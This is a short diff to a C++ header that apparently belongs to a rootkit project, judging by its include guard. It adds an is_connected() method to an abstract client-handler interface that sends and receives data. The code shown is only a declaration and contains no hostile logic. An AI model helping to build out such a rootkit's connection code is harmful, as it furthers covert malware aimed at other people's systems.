@@ -1,7 +1,3 @@
-//
-// Created by idan on 12/30/23.
-//
-
 #ifndef ROOTKIT_BASIC_CLIENT_HANDLER_H
 #define ROOTKIT_BASIC_CLIENT_HANDLER_H
 
@@ -10,6 +6,9 @@ class basic_client_handler {
 public:
     virtual int recv_data(char* buff, int count) = 0;
     virtual int send_data(const char* buff, int count) = 0;
+
+    virtual bool is_connected() = 0;
+
 };
 
 #endif //ROOTKIT_BASIC_CLIENT_HANDLER_H
